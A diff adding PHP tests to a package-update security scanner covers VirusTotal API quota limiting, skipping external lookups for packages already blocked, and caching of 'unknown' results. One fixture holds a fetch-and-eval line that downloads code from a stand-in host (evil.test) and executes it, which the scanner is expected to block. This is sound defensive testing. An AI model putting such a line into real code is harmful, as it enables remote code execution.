@@ -366,3 +366,67 @@ test('security: report contains what is needed (module, versions, source, sha256
     same('Services/Code.php', $r['findings'][0]['file']);
     same(5, $r['findings'][0]['line']);
 });
+
+test('VirusTotal free API budget: 4 / minute, 500 / day, 15.5 K / month, shared file', function () {
+    $file = tmpdir('budget').'/vt.json';
+    $now = strtotime('2026-10-15 12:00:00');
+    $slept = 0;
+    $make = function () use ($file, &$now, &$slept) {
+        $l = new \Modules\UpdateGuard\Services\Security\RateLimiter($file, ['minute' => 4, 'day' => 6, 'month' => 8]);
+        $l->clock = function () use (&$now) {
+            return $now;
+        };
+        $l->sleep = function ($s) use (&$now, &$slept) {
+            $slept += $s;
+            $now += $s;
+        };
+
+        return $l;
+    };
+    $l = $make();
+    for ($i = 0; $i < 4; $i++) {
+        same('', $l->acquire(0), 'request '.($i + 1));
+    }
+    same('minute', $l->acquire(0), 'a web page does not wait: 5th request in the same minute refused');
+    same('', $make()->acquire(60), 'a background process waits for the next slot');
+    same(60, $slept, 'waited until the oldest request is one minute old');
+    same('', $make()->acquire(60));
+    same('day', $make()->acquire(60), 'daily quota (6) reached, no waiting');
+    same(6, $make()->usage()['day']);
+    $now = strtotime('2026-10-16 08:00:00');
+    same('', $make()->acquire(0), 'new day');
+    same('', $make()->acquire(0));
+    same('month', $make()->acquire(0), 'monthly quota (8) reached');
+    $calls = 0;
+    $http = $make()->wrap(function () use (&$calls) {
+        $calls++;
+
+        return ['status' => 200, 'body' => ''];
+    });
+    $vt = new VirusTotalScanner('key', $http);
+    $r = $vt->lookupHash(str_repeat('e', 64));
+    same(ScanResult::ERROR, $r->status);
+    same('monthly quota reached', $r->message);
+    same(0, $calls, 'no request sent once the quota is used');
+});
+
+test('VirusTotal: not asked when the local checks already block (quota saved); unknown answers cached 1 day', function () {
+    $vt = new VirusTotalScanner('key', ug_http(['/files/' => [200, ug_vt_stats(0)]], $calls));
+    $r = ug_scan(ug_module_with('$c = file_get_contents("https://evil.test/p"); eval($c);'), [], [], [$vt]);
+    same('blocked', $r['decision']);
+    same(0, count($calls), 'no lookup for a package that is blocked anyway');
+    same(true, $r['external']['VirusTotal']['skipped']);
+    $r = ug_scan(ug_module_with('$c = file_get_contents("https://evil.test/p"); eval($c);'), [], [], [$vt], null, ['override']);
+    same(1, count($calls), 'override asked: the external scan is still done');
+
+    $sha = str_repeat('f', 64);
+    $cache = new ScanCache(tmpdir('cache3'), 7);
+    $unknown = new VirusTotalScanner('key', ug_http(['/files/' => [404, '']], $calls2));
+    ug_scan(ug_module_with(''), [], ['sha256' => $sha], [$unknown], $cache, ['skip_upload']);
+    ug_scan(ug_module_with(''), [], ['sha256' => $sha], [$unknown], $cache, ['skip_upload']);
+    same(1, count($calls2), '"unknown" answer reused from the cache');
+    $cache->clock = function () {
+        return time() + 2 * 86400;
+    };
+    same(null, $cache->get('VirusTotal', $sha), 'unknown answers expire after 1 day');
+});
